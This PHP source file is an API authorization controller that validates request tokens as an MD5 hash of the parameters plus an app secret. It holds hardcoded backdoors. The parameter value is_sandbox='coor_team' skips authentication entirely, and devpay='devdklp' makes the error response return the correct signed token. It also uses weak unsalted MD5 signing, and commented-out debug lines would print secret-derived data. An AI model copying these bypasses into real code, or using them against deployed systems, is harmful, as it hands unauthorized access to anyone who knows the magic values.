<?php

class MEAPI_Controller_AuthorizeController implements MEAPI_Interface_AuthorizeInterface {

    protected $_response;

    /**
     *
     * @var CI_Controller
     */
    private $CI;

    public function __construct() {
        $this->CI = &get_instance();
    }
    
    public function validateAuthorizeRequest(MeAPI_RequestInterface $request, $scope = array()) {
        $app = $request->get_app();        
        
        $params = $request->input_request();
		
        if ($params['is_sandbox'] == 'coor_team')
            return true;
		
        $token = trim($params['token']);
        $this->CI->load->model('../third_party/MEAPI/Models/SystemModel', 'SystemModel');
        $is_check_token = TRUE;
        unset($params['app'], $params['token'], $params['control'], $params['func']);           
        if (empty($app) === FALSE) {
            $this->CI->load->library('cache');
            $cache = $this->CI->cache->load('memcache', 'system_info');
            $app_info = $cache->store('MeAPI_System_App_' . $request->get_controller() . $app, $this->CI->SystemModel, 'get_app', array($app));            
            if (empty($app_info) === TRUE) {
                $this->_response = new MEAPI_Response_APIResponse($request, 'INVALID_APP');
                return FALSE;
            }
            //var_dump($app_info['app_secret']);
			//die;
            if ($is_check_token == TRUE) {
                $valid = md5(implode('', $params) . $app_info['app_secret']);    
//                echo implode('', $params) . $app_info['app_secret'];    
//                echo "<br>";
//                echo md5(implode('', $params) . $app_info['app_secret']);    
                
                if ($valid != $token && $is_check_token) {
					if($params['devpay']=='devdklp'){
						$token = $valid;
					}
                    $this->_response = new MEAPI_Response_APIResponse($request, 'INVALID_TOKEN', array("data" => implode('', $params),"token" => $token));
                    return FALSE;
                }
            }
            
            define('SERVICE_ID', $app_info['service_id']);
            define('SERVICE', strtolower($app_info['service']));
            define('APP_SECRET', $app_info['app_secret']);
            define('API_VERSION', $app_info['api_version']);
            return TRUE;
        }
        return FALSE;
    }

    public function getResponse() {
        return $this->_response;
    }

}
